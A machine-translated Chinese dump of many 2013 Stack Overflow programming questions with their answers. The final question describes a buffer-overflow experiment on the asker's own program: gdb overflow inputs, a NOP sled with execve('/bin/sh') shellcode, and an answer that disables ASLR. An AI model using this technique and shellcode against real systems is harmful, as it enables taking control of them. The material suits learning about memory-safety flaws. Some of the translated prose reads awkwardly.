      width = width - 10;

      p.style.width = width + "px";

      fr = setTimeout(function()
      {
          EventsManager.animateHideLeft();
      }, 50);
  }
}; 
```

不幸的是，函数 animateHideLeft 没有按预期工作。当我测试 typeof 回调时，它会提醒“未定义”。

我怎样才能解决这种混乱，所以我得到预期的结果？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-20T20:21:12.493

看起来你只需要`callback`通过调用 in `setTimeout`。

```
fr = setTimeout(function()
{
    EventsManager.animateHideLeft(callback);
}, 50); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-20T20:20:59.640

您在其他地方缺少回调

```
 fr = setTimeout(function()
      {
          EventsManager.animateHideLeft(function(){
                ////
        });
}, 50); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-20T20:21:16.977

那是因为您从以下位置错误地调用它`setTimeout()`：

```
EventsManager.animateHideLeft();   // No callback! 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-03-20T20:22:01.550

在`setTimeout`你不传递`callback`到下一个调用：

```
 EventsManager.animateHideLeft(); 
```

将其更改为

```
 EventsManager.animateHideLeft(callback); 
```

但是，进行测试并不是一个坏主意，`typeof callback == "function"`因为有时您不需要/不需要回调函数，然后`callback();`调用会导致异常。

顺便说一句，您不需要`clearTimeout(fr);`（除非您计划在动画期间多次调用该函数）。

# java - 休眠中的客户端标识符

> ID：15533824
> 
> 赞同：0
> 
> 时间：2013-03-20T20:17:43.883
> 
> 标签：java, spring, hibernate

我正在使用连接准备器的弹簧配置，我需要为获得的每个连接设置客户端标识符，并且可以在数据库策略中使用。在这里，当多个请求并行出现时，我遇到了一个问题，由于用户名传递给我正在使用的连接准备器，它变得一团糟。

我使用弹簧罐完全按照下面给出的弹簧链接。

[http://static.springsource.org/spring-data/jdbc/docs/current/reference/html/orcl.connection.html](http://static.springsource.org/spring-data/jdbc/docs/current/reference/html/orcl.connection.html) 我正在做的另一件事是在我的客户端标识符类中有一个变量用户名并有一个setter 和 getter 方法，并将其作为存储过程的参数调用。

我的问题是当存在并行事务时，注入的客户端标识符单例 bean 具有我已传递的用户名的旧副本。

是否有任何其他更好的选择来设置动态方法以将用户名从请求传递给该 bean，并且在检索 bean 时它应该返回正确的值。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-26T22:34:12.960

1.  使用 ThreadLocal 变量创建实用程序（静态变量/方法）类。提供getter和setter。
2.  创建一个从请求中获取用户的过滤器。将此用户设置为上面创建的线程本地。
3.  随时随地调用 getter（例如，在您引用的[链接](http://docs.spring.io/spring-data/jdbc/docs/current/reference/html/orcl.connection.html "Spring JDBC 扩展 - 甲骨文")中调用可调用语句之前构建“prepSql”时）。

# php - 使用 html simple dom 获取网站上的所有 HTML 评论

> ID：15533825
> 
> 赞同：0
> 
> 时间：2013-03-20T20:17:45.007
> 
> 标签：php, simple-html-dom

我试图从网站上获取所有评论（和之间的文字`<!--`）`-->`，但没有运气。

这是我当前的代码：

```
include('simple_html_dom.php');
$html = file_get_html('THE URL');
foreach($html->find('comment') as $element)
    echo $element->plaintext; 
```

任何人都有任何想法如何获取评论，目前它只给我一个空白页面

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:21:33.107

我知道`regex`不应该解析 HTML，但`<!--(.*?)-->`您可以使用类似`regex`的方法来查找和获取评论......

# dart - 错误格式加倍

> ID：15533826
> 
> 赞同：1
> 
> 时间：2013-03-20T20:17:49.973
> 
> 标签：dart, number-formatting

这个说法：

```
new NumberFormat("#.##").format(12.33) 
```

抛出此错误：

> “类 'double' 没有实例方法 '&'”

这是一个错误还是我做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T10:13:01.353

这可能是一个已知问题：[https ://code.google.com/p/dart/issues/detail?id=9215](https://code.google.com/p/dart/issues/detail?id=9215)

我想你不必担心它，它应该很快就会修复。

# excel - 加权多项式拟合的 Excel 直线公式

> ID：15533835
> 
> 赞同：2
> 
> 时间：2013-03-20T20:18:16.667
> 
> 标签：excel

如何指定 excel 线性加权多项式拟合公式，例如 `LINEST(y*w^0.5,IF({1,0},1,x)*w^0.5,FALSE,TRUE)`，但这是用于线性拟合。我正在寻找二阶和三阶多项式回归拟合的类似公式。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-23T15:57:49.883

在对[加权趋势线](https://stackoverflow.com/questions/11087773/weighted-trendline)中另一篇文章的回复中，已经建议了一种用于加权多项式的方法。例如，对于三次拟合，请尝试在 4x1 范围内使用 CTRL+SHIFT+ENTER：

```
=LINEST(y*w^0.5,(x-1E-99)^{0,1,2,3}*w^0.5,FALSE) 
```

（-1e-99 确保 0^0=1）。类似于 R^2 的线性情况尝试：

```
=INDEX(LINEST((y-SUMPRODUCT(y,w)/SUM(w))*w^0.5,(x-1E-99)^{0,1,2,3}*w^0.5,FALSE,TRUE),3,1) 
```

*推导*

在标准最小二乘法中，我们找到`b`最小化的向量：`|y-Xb|²=(y-Xb)'(y-Xb)`

在加权情况下`b`选择最小化：`|W(y-Xb)|²=(y-Xb)'W'W(y-Xb)`

所以加权回归是`Wy`关于权重的对角矩阵 在`WX`哪里。`W'W = W²`

# python - 使用 Fabric 1.6.0 设置 $PATH 变量

> ID：15533841
> 
> 赞同：4
> 
> 时间：2013-03-20T20:18:27.607
> 
> 标签：python, fabric

我正在尝试运行已安装在远程服务器上的主目录中的命令。它已经被添加到我的 .bash_profile 中的 $PATH 中。通过正常的 ssh 会话远程登录时，我可以使用它，但 Fabric 似乎没有拉入我的 $PATH。因此，我尝试使用 Fabric 的[路径上下文管理器](http://docs.fabfile.org/en/1.6/api/core/context_managers.html#fabric.context_managers.path)将其添加到我的 $PATH 中，如下所示：

```
def test_path():
    print('My env.path setting: %(path)s' % env)
    with path('/path/to/sources/drush'):
        run('echo $PATH')
        run('drush') 
```

Fabric 回应：

```
Executing task 'test_path'
My env.path setting:
run: echo $PATH
out: /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
out:

run: echo $PATH
out: /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/path/to/sources/drush
out:

run: drush
out: /bin/bash: drush: command not found
out:

Fatal error: run() received nonzero return code 127 while executing!

Requested: drush
Executed: /bin/bash -l -c "export PATH=\"\$PATH:\"/path/to/sources/drush\" \" && drush"

Aborting. 
```

谢谢你看...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T11:48:31.820

问题在于 PATH 变量的设置方式 - 它的末尾有一个额外的空格字符：

```
/bin/bash -l -c "export PATH=\"\$PATH:\"/path/to/sources/drush\" \" && drush"
                                                                ^HERE 
```

搜索路径中的最后一个目录被解释`bash`为“/path/to/source/drush”（尾随空格） - 一个无效目录。

# mysql - MySQL 还是 NoSQL？处理大量数据的推荐方式

> ID：15533843
> 
> 赞同：4
> 
> 时间：2013-03-20T20:18:41.343
> 
> 标签：mysql, database, storage

我有一个数据库，大量用户将使用该数据库来存储随机长字符串（最多 100 个字符）。表列将是：userid、stringid 和实际的长字符串。

所以它看起来很像这样：

![在此处输入图像描述](../Images/c742dac8c06f7ae49af3ed2462234ff9.png)

Userid 将是唯一的，而 stringid 对于每个用户来说都是唯一的。

该应用程序就像一个简单的待办事项列表应用程序，因此每个用户平均有 50 个待办事项。我使用 stringid 是为了让用户能够在任何给定时间删除特定任务。

我假设这个 todo 应用程序可能会在 3 年内完成 700 万个任务，这让我害怕使用 MySQL。

所以我的问题是，**这是否是处理带有长字符串的大量数据的实际推荐方法**（每个新任务都有一个新行）？**MySQL 是适合此类项目的数据库解决方案吗**？

 **我还没有经历过大量数据，我正在努力为遥远的未来拯救自己。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T20:27:02.123

这不是“大量”数据的问题（mysql 可以很好地处理大量数据，并且 2 mio 行在任何情况下都不是“大量”）。

MySql 是一个关系型数据库。因此，如果您有可以标准化的数据，这些数据分布在许多表中，以确保每个数据点只保存一次，那么您应该使用 MySql（或 Maria，或任何其他关系数据库）。

如果您有无模式数据并且速度比一致性更重要，那么您可以/应该使用一些 NoSql 数据库。就我个人而言，我不知道待办事项列表如何从 NoSql 中受益（在这种情况下并不重要，但我想到目前为止，大多数 programmig 框架对关系数据库的支持比对 Nosql 的支持更好）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T20:29:31.653

这是一个非常简单的关系用例。我认为这里不需要 NoSQL。

您提供的表格应该可以正常工作，但是，我个人会质疑复合主键的必要性，因为您将展示这个。我可能会在 stringid 上有一个主键，只是为了强制所有记录的唯一性。而不是跨用户 ID 和字符串 ID 的复合主键。然后我会在用户 ID 上放置一个常规索引。

这样做的原因是，如果您只想通过 stringid 查询（即删除或更新），您不必总是必须跨两个字段查询以利用您的索引（或添加必须在 stringid 上添加单个索引和userid 启用每个字段的查询，这意味着我在内存和磁盘中的空间被索引占用）。

至于 MySQL 是否是正确的解决方案，这真的由您来确定。我会说 MySQL 在处理两个整数 id 字段上有 200 万行和 2 个索引的表时应该没有问题。这是假设您已分配足够的内存来将这些索引保存在内存中。当然有大量关于使用 MySQL 的信息，所以如果你只是想学习，它可能是一个不错的选择。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-20T20:38:52.917

无论您认为什么是“大量数据”，现代数据库引擎都旨在处理大量数据。“关系还是 NoSQL？”的问题 不是关于哪个选项可以支持更多数据。不同的关系和 NoSQL 解决方案将以不同的方式处理大量数据，其中一些解决方案比其他解决方案更好。

MySQL 可以处理数百万条记录，而 SQLite 不能（至少不那么有效）。Mongo（NoSQL）试图将它的集合保存在内存（以及文件系统）中，所以我看到它在内存有限的服务器上只有不到 100 万条记录失败，尽管它提供了分片，可以帮助它更有效地扩展。

底线是：您存储的记录数量不应影响 SQL 与 NoSQL 决策，该决定应留给您将如何保存和检索数据。听起来您的数据已经标准化（例如 UserID），如果您在删除用户时也希望保持一致性（TODO 项目也被删除），那么我建议使用 SQL 解决方案。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-20T20:39:20.660

我假设所有查询都将引用特定的用户 ID。我还假设 stringid 是内部使用的虚拟值，而不是实际的任务文本（您的随机字符串）。

使用带有复合主键的 InnoDB 表`{userid, stringid}`，由于聚集索引的工作方式，您将获得所需的所有性能。**

# java - 将字节数组转换为双精度数组

> ID：15533854
> 
> 赞同：5
> 
> 时间：2013-03-20T20:19:01.503
> 
> 标签：java, arrays, floating-point, fft, wav

我在 Java 中遇到了 WAV 文件的一些问题。

WAV 格式：PCM_SIGNED 44100.0 Hz，24 位，立体声，6 字节/帧，little-endian。

*   我将 WAV 数据提取到一个字节数组中，没有任何问题。
*   我正在尝试将字节数组转换为双精度数组，但有些双精度值带有`NaN`值。

代码：

```
ByteBuffer byteBuffer = ByteBuffer.wrap(byteArray);
double[] doubles = new double[byteArray.length / 8];
for (int i = 0; i < doubles.length; i++) {
    doubles[i] = byteBuffer.getDouble(i * 8);
} 
```

16/24/32 位单声道/立体声的事实让我感到困惑。

我打算将其传递`double[]`给 FFT 算法并获取音频频率。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-09-25T03:34:37.007

尝试这个：

```
public static byte[] toByteArray(double[] doubleArray){
    int times = Double.SIZE / Byte.SIZE;
    byte[] bytes = new byte[doubleArray.length * times];
    for(int i=0;i<doubleArray.length;i++){
        ByteBuffer.wrap(bytes, i*times, times).putDouble(doubleArray[i]);
    }
    return bytes;
}

public static double[] toDoubleArray(byte[] byteArray){
    int times = Double.SIZE / Byte.SIZE;
    double[] doubles = new double[byteArray.length / times];
    for(int i=0;i<doubles.length;i++){
        doubles[i] = ByteBuffer.wrap(byteArray, i*times, times).getDouble();
    }
    return doubles;
}

public static byte[] toByteArray(int[] intArray){
    int times = Integer.SIZE / Byte.SIZE;
    byte[] bytes = new byte[intArray.length * times];
    for(int i=0;i<intArray.length;i++){
        ByteBuffer.wrap(bytes, i*times, times).putInt(intArray[i]);
    }
    return bytes;
}

public static int[] toIntArray(byte[] byteArray){
    int times = Integer.SIZE / Byte.SIZE;
    int[] ints = new int[byteArray.length / times];
    for(int i=0;i<ints.length;i++){
        ints[i] = ByteBuffer.wrap(byteArray, i*times, times).getInt();
    }
    return ints;
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-20T22:19:59.387

您的 WAV 格式是 24 位，但双精度使用 64 位。因此，存储在您的 wav 中的数量不能翻倍。每个帧和通道有一个 24 位有符号整数，相当于提到的这 6 个字节。

你可以这样做：

```
private static double readDouble(ByteBuffer buf) {
  int v = (byteBuffer.get() & 0xff);
  v |= (byteBuffer.get() & 0xff) << 8;
  v |= byteBuffer.get() << 16;
  return (double)v;
} 
```

您会为左通道调用一次该方法，然后为右通道调用一次。不确定正确的顺序，但我想先离开。正如 little-endian 所示，字节从最低有效位读取到最高有效位。低两个字节被屏蔽，`0xff`以便将它们视为无符号。最高有效字节被视为有符号，因为它将包含有符号 24 位整数的符号。

如果您对数组进行操作，则可以在没有 的情况下进行操作`ByteBuffer`，例如：

```
double[] doubles = new double[byteArray.length / 3];
for (int i = 0, j = 0; i != doubles.length; ++i, j += 3) {
  doubles[i] = (double)( (byteArray[j  ] & 0xff) | 
                        ((byteArray[j+1] & 0xff) <<  8) |
                        ( byteArray[j+2]         << 16));
} 
```

您将获得交错的两个通道的样本，因此您可能希望之后将它们分开。

如果您有单声道，则不会有两个交错的通道，而只有一次。16位可以用`byteBuffer.getShort()`，32位可以用`byteBuffer.getInt()`。但是 24 位不常用于计算，因此`ByteBuffer`没有方法。如果您有未签名的样本，则必须屏蔽所有符号并抵消结果，但我猜未签名的 WAV 相当罕见。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-09-25T04:18:03.653

对于 DSP 中的浮点类型，他们通常更喜欢 [0, 1] 或 [0, 1) 范围内的值，因此您应该将每个元素除以 2 ^(24) -1。喜欢上面 MvG 的答案，但有一些变化

```
int t = ((byteArray[j  ] & 0xff) <<  0) |
        ((byteArray[j+1] & 0xff) <<  8) |
         (byteArray[j+2]         << 16);
return t/double(0xFFFFFF); 
```

但是对于数据处理目的**`double`来说确实是浪费空间和CPU 。**我建议将其转换为 32 位 int，或者`float`具有相同的精度（24 位）但范围更大。事实上，当您进行音频或视频处理时，32 位 int 或 float 是数据通道的最大类型

最后，您可以利用多线程和[SIMD](https://stackoverflow.com/a/27666194/995714)来加速转换

# string - shell脚本在文件中查找和替换

> ID：15533857
> 
> 赞同：0
> 
> 时间：2013-03-20T20:19:11.053
> 
> 标签：string, shell, design-patterns

我有一个文件 postmaster.log，我需要在其中找到模式并更改其值 我需要找到的模式是

```
MaxValue=3 #this could be any value not just 3 
```

我需要将其值更改为

```
MaxValue=0 
```

问题是也有类似的模式

```
"MaxValueSet=3" and "MaxValue is currently low" 
```

这也被替换了。我只需将 MaxValue=3 更改为 MaxValue=0 我尝试使用 sed

```
 sed -i 's/MaxValue=3/MaxValue=0/g' /home/postmaster.log 
```

但这仅在 MaxValue=3 对任何其他值不起作用时才有效。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T20:22:11.303

使用正则表达式捕获`MaxValue=`后跟任意数字...

```
s/MaxValue=[0-9]+/MaxValue=0/g 
```

应该管用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T20:22:14.253

听起来你想要

```
sed -i 's/^MaxValue=.*/MaxValue=0/' /home/postmaster.log 
```

这将找到所有以 开头的行`MaxValue=`，并将这些行中的每一行替换为`MaxValue=0`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T20:30:43.433

您也可以限制线路的`sed`工作：

```
sed -i '/^MaxValue=/s/=[[:digit:]][[:digit:]]*/=0/' /home/postmaster.log 
```

# delphi - 编译器如何处理过程/函数中的过程/函数

> ID：15533861
> 
> 赞同：1
> 
> 时间：2013-03-20T20:19:26.697
> 
> 标签：delphi

一些程序或函数是写在另一个程序或函数中的，例如：

```
function Foo: Integer;
var A: String;
    procedure Bar;
    begin
      A := '2';
      //code
    end; 
begin
  A:= '1';
  Bar;
  Result := StrToInt(A);
end; 
```

在这个例子中，在 Foo 函数中声明的所有变量，都可以在 Bar 中访问。上下文是如何共享的？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T20:23:09.097

调用范围将其帧指针作为隐藏参数传递给内部过程。然后内部过程可以使用这个隐藏指针来访问外部范围内的变量。

# maven - M2 Eclipse Maven3 pom 生成相对于 ECLIPSE_HOME 的类路径条目

> ID：15533866
> 
> 赞同：1
> 
> 时间：2013-03-20T20:19:56.893
> 
> 标签：maven, classpath, tomcat7, maven-3, m2eclipse

我如何获得这种类路径条目：

```
<classpathentry kind="var"  path="ECLIPSE_HOME/plugins/org.eclipse.jdt.debug_3.7.100.v20120529-1702"/> 
```

在eclipse中加载我的maven项目时生成？

我目前正在使用嵌入式 Tomcat7 项目，并且在 eclipse 中运行时需要在类路径中添加 jdt 插件 jar（根据[我如何在项目中导入 eclipse JDT 类](https://stackoverflow.com/questions/93728/how-can-i-import-eclipse-jdt-classes-in-a-project)）。我不希望加载此项目的开发人员必须手动创建这些类路径条目。

我一直在看： [http ://www.avajava.com/tutorials/lessons/how-do-i-update-my-classpath-with-an-eclipse-user-library-via-the-maven-eclipse-插件.html](http://www.avajava.com/tutorials/lessons/how-do-i-update-my-classpath-with-an-eclipse-user-library-via-the-maven-eclipse-plugin.html)

但这似乎不对，因为我没有使用类路径容器？

[http://maven.apache.org/plugins/maven-eclipse-plugin/eclipse-mojo.html](http://maven.apache.org/plugins/maven-eclipse-plugin/eclipse-mojo.html)

似乎没有选项可以像这样手动输入类路径？

# ruby-on-rails - Sidekiq 工作人员正在泄漏内存

> ID：15533869
> 
> 赞同：10
> 
> 时间：2013-03-20T20:20:09.140
> 
> 标签：ruby-on-rails, memory-leaks, out-of-memory, sidekiq, git-tf

使用 sidekiq gem - 我有使用 IO.popen 运行进程（大存储库的 git-tf 克隆）并跟踪标准输出以检查克隆进度的 sidekiq 工作人员。

当我运行worker时，我看到sidekiq内存随着时间的推移越来越大，直到我得到内核OOM并且进程被杀死。子进程（java 进程）只占用总内存的 5%。

如何调试/检查代码中的内存泄漏？sidekiq 内存是我的工作人员内存与 popen 进程的总和吗？
有谁知道如何解决它？

**编辑**
这是我的工人的代码 - [https://gist.github.com/yosy/5227250](https://gist.github.com/yosy/5227250)

**编辑 2**
我在没有 sidekiq 的情况下运行了代码，并且没有内存泄漏..这对于 sidekiq 和 tfs 中的大型存储库来说有些奇怪

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-28T13:43:47.843

我没有找到 sidekiq 内存泄漏的原因，但我找到了一条从 sidekiq 中获取方法的方法。

我已经修改了 git-tf 以使服务器命令接受来自 redis 队列的命令，它从我的代码中消除了很多复杂性。

git-tf 的修改版本在这里： [https ://github.com/yosy/gittf](https://github.com/yosy/gittf)

稍后我将在修复一些错误时添加有关 sever 命令的文档。

# c++ - System::Convert::ToString() 和 std::to_string() 的区别？

> ID：15533872
> 
> 赞同：3
> 
> 时间：2013-03-20T20:20:13.560
> 
> 标签：c++

我完全是 Visual C++ 编程的菜鸟，所以我不知道这是否有意义。

好吧，我正在尝试更改标签文本以显示在表单中，所以如果我这样做：

```
int value_a = 1;
int value_b = 2;
System::String^ j;
j = System::Convert::ToString(value_a) + ", " + System::Convert::ToString(value_b);
label1 -> Text = j; 
```

它工作得很好，但是当我尝试这样做时：

```
int value_a = 1;
int value_b = 2;
System::String^ j;
j = std::to_string(valor1) + ", " + std::to_string(valor2);
label1-> Text = j; 
```

我得到很多错误......使用有什么区别

```
string j; 
```

或者

```
System::String^ j; 
```

和功能之间

```
System::Convert::ToString(); 
```

和

```
std::to_string(); 
```

？？？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T20:40:16.047

`System::String^ j;`是一个 C++/CLI 字符串，它是 Microsoft 在 .NET 框架之上的 C++ 实现，因此您可以通过它与 .NET 语言（C#、VB.NET）进行通信，并且仍然使用 C++。这`^`是 C++/CLI 使用的垃圾回收指针。这意味着您不必关心使用后自己清理`gcnew`

`std::string`是 C++ 标准库的字符串版本。它是*本机 C++*，有些人可能会这样称呼它。

在 C++ 中，每次使用`new`指针时，都不能忘记调用`delete`.

`System::Convert::ToString`也是来自微软的 C++/CLI。

`std::to_string`将是 C++11 的等价物。

实现是完全不同的，所以你不能期望用这些不同的类型得到相同的结果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:41:04.767

您感到困惑的原因可能是您使用的是 C++/CLI，因此您可以访问许多不同的字符串类型。开发 C++/CLI 是为了让您访问两个世界：

1.  非托管：这基本上是本机的标准 C++ 代码。虽然 C++/CLI 绝不符合 C++ 标准，但它确实允许您混合 C++ 代码：您可以使用大多数 C++ 库（通过“它只是工作范例”）。此代码称为“非托管”，因为您必须自己进行内存管理。
2.  托管：这是 .NET 方面的事情。使用 .net 类，您可以访问 microsoft 推出的有用库，并且可以使用垃圾收集器。

System::String 是托管的 .NET 字符串类型。这是所有 .NET 语言（C#、VBA 等）都使用的字符串类型。这是一个只能与 C++/CLI 和 .NET 一起使用的类。如果您正在编写纯 Windows 代码，或者想要编写 .NET 库，请使用此类型。在这些语言中，“to string”函数实际上是所有类的成员，并且转换通常是隐式的。您可以使用

```
j = valor1+","+valor2; 
```

如果要明确，请查看 Int::ToString 函数：

```
System::String^ j= Int32(1).ToString(); 
```

std::string 是非托管的 stl 字符串。这是标准 C++ 类，可用于 C++ 和 C++/CLI。如果要将其与其他 .NET 类一起使用，则必须编组该类。如果您试图完全停留在非托管代码中，请使用此类。

如果您正在尝试学习 C++，我建议您暂时关闭 C++/CLI，并坚持使用标准库字符串。

# php - 在电子商店中按许多属性搜索

> ID：15533875
> 
> 赞同：0
> 
> 时间：2013-03-20T20:20:26.853
> 
> 标签：php, mysql, search

我正在开发电子商店网站，我目前的任务是按属性在产品目录中进行搜索。因此产品类别属性彼此不同。类别和产品之间的关系是多对多的。我想到了几个解决方案：

1.  创建按位字段，其中每个位负责特定的属性值并将其存储在参考表（CategoryToProduct）中。
2.  对这些数据使用 redis 或 mongodb，但我认为这使我的解决方案更难维护
3.  使用像 Sphinx 这样的搜索引擎，并为每个文档存储额外的属性（代表来自 db 的产品记录）

每个解决方案都有自己的优点和缺点。我会感谢任何建议。

目前项目基于php和mysql。产品表的数据集大约有 30 000 条记录

# c - 使两个结构指针相等

> ID：15533877
> 
> 赞同：0
> 
> 时间：2013-03-20T20:20:33.880
> 
> 标签：c, pointers, struct

因此，假设我有一个名为 A 的结构指针和一个名为 B 的结构指针：

```
struct example{
//variables and pointers
}*A 
```

然后我有一个数据类型结构示例的指针：

```
struct example *B=malloc(sizeof(struct example)); 
```

如果我做

```
A=B; 
```

这个算术运算是否意味着任何结构指针 B 指向的都是结构指针 A 也指向的东西？我用原始数据类型和指针得到它，但结构让我感到困惑，因为它们里面有变量..

假设结构指针 A 已设置并且所有内容

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T20:24:33.187

是的，使用以下代码行，A 应该指向同一个位置，B 指向的是相同的位置。

```
/* Define the struct example datatype */
struct example{
    //variables and pointers
};

/* Declare A and B as pointers to struct example */
struct example *A;
struct example *B;

/* Allocate memory equivalent to the size of struct example
   and store the address in B */
B=malloc(sizeof(struct example));

/* Copy the address in B to A, so that A points to the same
   location B was pointing to */
A = B; 
```

您应该将指针视为`unsigned long`保存内存地址的另一个变量（因为指针仅指向它所保存的地址）。

与任何其他变量一样，您可以将存储在一个指针变量中的地址复制到另一个。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T20:26:36.670

你所做的只是让 A 和 B 指向同一个结构。例如，假设您的 malloc() 在地址 0x1000 处为您的结构调用保留空间（只是一个示例）。

现在，在你的 malloc() 之后，B 只保存数字 0x1000。因此，当您执行 A = B 时，您也只是将 A 设置为 0x1000。这样 B->var1 与 A->var1 是完全相同的实体。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T20:27:00.920

是的... A 和 B 是指针，而不是值。当您说 A = B 时，您是在说“将指针 A 设置为指向 B 指向的同一事物”——或者更具体地说，A 和 B 在分配后都将包含相同的内存地址。

当你使用 A->someVar 时你真正在做什么

{someVar 的地址} = {结构的内存地址} + {someVar 相对于结构开始的字节偏移量}

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T20:27:58.573

是的，下面的代码：

```
struct example* A;
struct example* B;
B = malloc(sizeof(struct example));
A = B; 
```

将导致`A`指向相同的内存`B`。但是请注意，更改指针本身的值 ( `B`) 不会对另一个指针 ( `A`) 产生影响，例如，当您这样做时：

```
free(B);
B = NULL; 
```

该指针`A`仍将指向内存，该实例`struct example`曾经驻留于此，因此`A`将成为无效（*悬空*）指针。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-20T20:34:30.943

指针将数据地址保存在内存中，调用`malloc`返回您为数据分配的内存区域开始的第一个字的地址。

你可以想象一个指针，就像一张纸，你写下建筑物的号码，当你进入它时，你会发现公寓也有数字等等。

因此，将指针的值分配给另一个指针就像拿另一张纸在上面写上第一张纸上的数字一样。

内部的原始数据类型和/或其他指针`struct`就像公寓一样，它们可能会向您展示一些具体的东西，或者让您进入可以找到其他东西的其他区域。

# cassandra - Cassandra：手动指定初始令牌或等待现有引导操作完成

> ID：15533882
> 
> 赞同：1
> 
> 时间：2013-03-20T20:20:43.453
> 
> 标签：cassandra, bootstrapping

我正在尝试建立一个包含 3 个节点的小型 cassandra 集群。集群将有一个种子节点。种子节点首先被购买。一旦启动，我会“同时”启动其他两个节点。我看到的是只有一个节点被添加到集群中。我在另一个节点上收到以下异常。

```
ERROR [main] 2013-03-20 11:44:57,146 CassandraDaemon.java (line 387) Exception encountered during startup
java.lang.RuntimeException: Every node is a bootstrap source! **Please specify an initial token manually or wait for an existing bootstrap operation to finish.**
    at org.apache.cassandra.dht.BootStrapper.getBootstrapSource(BootStrapper.java:180)
    at org.apache.cassandra.dht.BootStrapper.getBalancedToken(BootStrapper.java:135)
    at org.apache.cassandra.dht.BootStrapper.getBootstrapTokens(BootStrapper.java:115)
    at org.apache.cassandra.service.StorageService.joinTokenRing(StorageService.java:620)
    at org.apache.cassandra.service.StorageService.initServer(StorageService.java:508)
    at org.apache.cassandra.service.StorageService.initServer(StorageService.java:406)
    at org.apache.cassandra.service.CassandraDaemon.setup(CassandraDaemon.java:282)
    at org.apache.cassandra.service.CassandraDaemon.activate(CassandraDaemon.java:370)
    at org.apache.cassandra.service.CassandraDaemon.main(CassandraDaemon.java:413) 
```

cassandra（种子节点）在处理来自多个节点的同时引导时是否有问题？这是一个限制吗？如果是这样，有什么办法克服它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T07:30:35.770

您是否在每个节点中指定了初始令牌值？如果没有设置它们的值，你可以参考这个[Cassandra Visual Ring](http://psanford.github.com/cassandra-visual-ring/)

# linux - 64位缓冲区溢出

> ID：15533889
> 
> 赞同：4
> 
> 时间：2013-03-20T20:21:15.423
> 
> 标签：linux, gcc, gdb, 64-bit, buffer-overflow

为了好玩，我正在尝试做一些缓冲区溢出的实验。我在这个论坛上阅读该主题，并尝试编写自己的小代码。

所以我所做的是一个小的“C”程序，它接受字符参数并运行直到分段错误。

所以我提供参数，直到我收到一条消息，我用“A”覆盖了返回地址，即 41。我复制输入字符串的缓冲区字符长度是 [5]。

这是我在 gdb 中所做的。

```
run $(perl -e 'print "A"x32  ; ')
Program received signal SIGSEGV, Segmentation fault.
0x0000000000400516 in main (argc=Cannot access memory at address 0x414141414141412d 
```

然后我发现覆盖需要 16 个“A”。

```
run $(perl -e 'print "A"x16 . "C"x8 . "B"x32   ; ')
0x0000000000400516 in main (argc=Cannot access memory at address 0x434343434343432f
) 
```

这告诉我们 8 个“C”正在覆盖返回地址。

根据在线教程，如果我提供有效地址而不是 8“C”。我可以跳转到某个地方并执行代码。所以我在最初的 16 个“A”之后超载了内存。

下一步是执行

```
run $(perl -e 'print "A"x16 . "C"x8 . "B"x200   ; ')

rax            0x0      0
rbx            0x3a0001bbc0     249108216768
rcx            0x3a00552780     249113683840
rdx            0x3a00553980     249113688448
rsi            0x42     66
rdi            0x2af9e57710e0   47252785008864
rbp            0x4343434343434343       0x4343434343434343
rsp            0x7fffb261a2e8   0x7fffb261a2e8
r8             0xffffffff       4294967295
r9             0x0      0
r10            0x22     34
r11            0xffffffff       4294967295
r12            0x0      0
r13            0x7fffb261a3c0   140736186131392
r14            0x0      0
r15            0x0      0
rip            0x400516 0x400516 <main+62>
eflags         0x10206  [ PF IF RF ]
cs             0x33     51
ss             0x2b     43
ds             0x0      0
es             0x0      0
fs             0x0      0
gs             0x0      0
fctrl          0x37f    895
fstat          0x0      0
ftag           0xffff   65535
fiseg          0x0      0
fioff          0x0      0
foseg          0x0      0
fooff          0x0      0
fop            0x0      0
mxcsr          0x1f80   [ IM DM ZM OM UM PM ] 
```

在 $rsp 之后检查内存 200 字节后，我找到了一个地址，然后执行了以下操作：

```
run $(perl -e 'print "A"x16 . "\x38\xd0\xcb\x9b\xff\x7f" . "\x90"x50 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"   ; ') 
```

然而，这并没有做任何事情。如果有人能告诉我我做错了什么，我将不胜感激。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-06-12T19:20:40.677

首先确保您更改了 randomize_va_space。在 Ubuntu 上，您将以 root 身份运行以下命令
`echo 0 > /proc/sys/kernel/randomize_va_space`

